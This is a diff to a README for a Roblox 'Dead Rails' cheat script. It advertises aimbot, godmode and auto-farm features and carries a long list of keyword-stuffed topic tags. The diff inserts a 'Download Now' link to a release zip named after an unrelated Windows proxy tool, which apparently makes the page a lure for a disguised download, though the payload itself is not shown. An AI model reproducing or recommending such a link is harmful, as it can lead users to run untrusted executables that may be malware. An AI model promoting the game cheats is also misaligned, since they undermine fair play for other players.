@@ -2,7 +2,7 @@
 
 
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-blue)]([ZIP_LINK])
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-blue)]([Скачать архив](https://github.com/southwestwood5/roblox_2/releases/download/v1.0.0/charles-proxy-5.0.1-win-x86_64.zip))
 
 
 
@@ -14,7 +14,7 @@ Welcome to the ultimate script for Dead Rails that unlocks over 60 exciting feat
 - **Topics**: dead-rails-script, dead-rails-script-2025, dead-rails-script-aimbot, dead-rails-script-auto-complete-game, dead-rails-script-auto-farm, dead-rails-script-auto-farm-bonds, dead-rails-script-autofarm, dead-rails-script-bonds, dead-rails-script-bring-items, dead-rails-script-esp, dead-rails-script-fly, dead-rails-script-godmode, dead-rails-script-infinite-bonds, dead-rails-script-keyless, dead-rails-script-kill-aura, dead-rails-script-new-update, dead-rails-script-no-key, dead-rails-script-noclip, dead-rails-script-speed-hub-x, dead-rails-script-xeno
 
 
-[IMAGE_LINK]
+![Image](https://raw.githubusercontent.com/southwestwood5/roblox_2/main/image.png)
 ## Access the Latest Release:
 Click the button below to access the latest release of the ultimate script. Stay updated with all the amazing features and enhancements!
 
